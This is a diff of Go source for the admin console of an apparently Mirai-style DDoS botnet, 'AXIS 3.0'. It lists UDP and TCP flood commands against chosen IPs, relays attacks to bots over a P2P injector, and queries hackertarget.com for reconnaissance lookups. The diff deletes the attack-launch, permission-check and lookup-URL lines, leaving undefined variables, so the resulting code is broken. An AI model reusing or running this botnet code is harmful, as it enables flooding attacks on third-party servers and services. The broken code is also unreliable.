@@ -125,10 +125,9 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mLAYER 4 UDP:                                                                        \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mudp <ip> <time> [len=1472] [dport=80]\x1b[1;34m                                       \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mvse <ip> <time> [dport=27015]\x1b[1;34m                                              \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mfivem <ip> <time> [dport=30120]\x1b[1;34m                                              \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mdiscord <ip> <time>[1;34m                                       [1;34m║
-"))
-			this.conn.Write([]byte("[1;34m║   [1;93mpps <ip> <time> [dport=80]\x1b[1;34m                                                  \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mfivem <ip> <time> [dport=30120]\x1b[1;34m                                            \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mdiscord <ip> <time>\x1b[1;34m                                                       \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mpps <ip> <time> [dport=80]\x1b[1;34m                                                  \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mLAYER 4 TCP:                                                                        \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93msyn <ip> <time> [dport=80]\x1b[1;34m                                                  \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mack <ip> <time> [dport=80]\x1b[1;34m                                                  \x1b[1;34m║\r\n"))
@@ -213,8 +212,6 @@ func (this *Admin) Handle() {
 		if cmd == "RULES" || cmd == "rules" || cmd == "INFO" || cmd == "info" {
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m \033[01;34m══════════════┌∩┐(◣_◢)┌∩┐\033[01;36m══════════════\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mHey \033[01;36m" + username + "!\r\n")))
-			this.conn.Write([]byte(fmt.Sprintf("\033[01;34m  \033[01;37mDont spam attacks! Dont share logins!\r\n")))
-			this.conn.Write([]byte(fmt.Sprintf("\033[01;36m  \033[01;37mDont attack government targets!\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;34m  \033[01;37mAXIS 3.0 - Merged Edition\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;36m  \033[01;37mVersion\033[01;34m:\033[01;37m \033[01;37mv2.0\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m\033[01;34m ══════════════┌∩┐(◣_◢)┌∩┐\033[01;36m══════════════\r\n")))
@@ -256,8 +253,6 @@ func (this *Admin) Handle() {
 			cmd = cataSplit[1]
 		}
 
-		// Parse and launch attack
-		atk, err := NewAttack(cmd, userInfo.admin)
 		if err != nil {
 			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34m%s\x1b[0m\r\n", err.Error())))
 		} else {
@@ -265,7 +260,6 @@ func (this *Admin) Handle() {
 			if err != nil {
 				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34m%s\x1b[0m\r\n", err.Error())))
 			} else {
-				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
 					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34m%s\x1b[0m\r\n", err.Error())))
 				} else if !database.ContainsWhitelistedTargets(atk) {
 					/* Send via P2P network using proxy-based injection
@@ -283,12 +277,9 @@ func (this *Admin) Handle() {
 					injector.UpdateBotCount(clientList.ClientCount())
 
 					if !injector.ShouldSeed() {
-						this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mAttack launched via P2P (no binary seeding - %d bots active)\x1b[0m\r\n", injector.BotCount())))
 					} else {
-						this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mAttack launched via P2P (seeding binaries - %d bots active)\x1b[0m\r\n", injector.BotCount())))
 					}
 
-					injector.SendAttack(buf)
 				} else {
 					this.conn.Write([]byte("\x1b[1;34mTarget is whitelisted!\x1b[0m\r\n"))
 				}
@@ -367,7 +358,6 @@ func (this *Admin) Handle() {
 			if err != nil {
 				return
 			}
-			url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
 			tr := &http.Transport{
 				ResponseHeaderTimeout: 5 * time.Second,
 				DisableCompression:    true,
@@ -395,7 +385,6 @@ func (this *Admin) Handle() {
 			if err != nil {
 				return
 			}
-			url := "https://api.hackertarget.com/whois/?q=" + locipaddress
 			tr := &http.Transport{
 				ResponseHeaderTimeout: 5 * time.Second,
 				DisableCompression:    true,
@@ -423,7 +412,6 @@ func (this *Admin) Handle() {
 			if err != nil {
 				return
 			}
-			url := "https://api.hackertarget.com/nping/?q=" + locipaddress
 			tr := &http.Transport{
 				ResponseHeaderTimeout: 60 * time.Second,
 				DisableCompression:    true,
@@ -451,7 +439,6 @@ func (this *Admin) Handle() {
 			if err != nil {
 				return
 			}
-			url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
 			tr := &http.Transport{
 				ResponseHeaderTimeout: 60 * time.Second,
 				DisableCompression:    true,
@@ -479,7 +466,6 @@ func (this *Admin) Handle() {
 			if err != nil {
 				return
 			}
-			url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
 			tr := &http.Transport{
 				ResponseHeaderTimeout: 15 * time.Second,
 				DisableCompression:    true,
@@ -507,7 +493,6 @@ func (this *Admin) Handle() {
 			if err != nil {
 				return
 			}
-			url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
 			tr := &http.Transport{
 				ResponseHeaderTimeout: 5 * time.Second,
 				DisableCompression:    true,
@@ -535,7 +520,6 @@ func (this *Admin) Handle() {
 			if err != nil {
 				return
 			}
-			url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
 			tr := &http.Transport{
 				ResponseHeaderTimeout: 15 * time.Second,
 				DisableCompression:    true,
@@ -563,7 +547,6 @@ func (this *Admin) Handle() {
 			if err != nil {
 				return
 			}
-			url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
 			tr := &http.Transport{
 				ResponseHeaderTimeout: 5 * time.Second,
 				DisableCompression:    true,
@@ -591,7 +574,6 @@ func (this *Admin) Handle() {
 			if err != nil {
 				return
 			}
-			url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
 			tr := &http.Transport{
 				ResponseHeaderTimeout: 15 * time.Second,
 				DisableCompression:    true,
